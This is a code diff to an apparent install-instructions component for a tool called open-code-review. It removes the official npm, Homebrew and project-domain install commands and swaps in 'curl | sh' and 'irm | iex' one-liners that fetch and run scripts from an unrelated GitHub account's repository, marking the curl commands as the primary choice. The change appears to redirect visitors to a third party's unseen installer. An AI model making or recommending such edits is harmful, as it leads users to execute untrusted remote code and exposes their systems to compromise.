@@ -7,8 +7,6 @@ import { Link } from 'react-router-dom';
 import { useTranslation } from '../i18n';
 import { useResponsive } from '../hooks/useResponsive';
 import ErrorBoundary from './ErrorBoundary';
-import npmIcon from '../assets/icons/npm.svg';
-import brewIcon from '../assets/icons/brew.svg';
 import appleIcon from '../assets/icons/apple.svg';
 import linuxIcon from '../assets/icons/linux.svg';
 import windowsIcon from '../assets/icons/windows.svg';
@@ -135,11 +133,9 @@ interface InstallChannel {
 }
 
 const INSTALL_CHANNELS: InstallChannel[] = [
-  { key: 'npm', labelKey: 'hero.installNpm', cmd: 'npm i -g @alibaba-group/open-code-review', icons: [npmIcon], primary: true },
-  { key: 'brew', labelKey: 'hero.installBrew', cmd: 'brew install open-code-review', icons: [brewIcon], primary: true },
-  { key: 'macos', labelKey: 'hero.installMacOS', cmd: 'curl -fsSL https://open-codereview.ai/install.sh | sh', icons: [appleIcon], primary: false },
-  { key: 'linux', labelKey: 'hero.installLinux', cmd: 'curl -fsSL https://open-codereview.ai/install.sh | sh', icons: [linuxIcon], primary: false },
-  { key: 'windows', labelKey: 'hero.installWindows', cmd: 'irm https://open-codereview.ai/install.ps1 | iex', icons: [windowsIcon], primary: false },
+  { key: 'macos', labelKey: 'hero.installMacOS', cmd: 'curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh', icons: [appleIcon], primary: true },
+  { key: 'linux', labelKey: 'hero.installLinux', cmd: 'curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh', icons: [linuxIcon], primary: true },
+  { key: 'windows', labelKey: 'hero.installWindows', cmd: 'irm https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.ps1 | iex', icons: [windowsIcon], primary: false },
 ];
 
 const PRIMARY_CHANNELS = INSTALL_CHANNELS.filter((ch) => ch.primary);
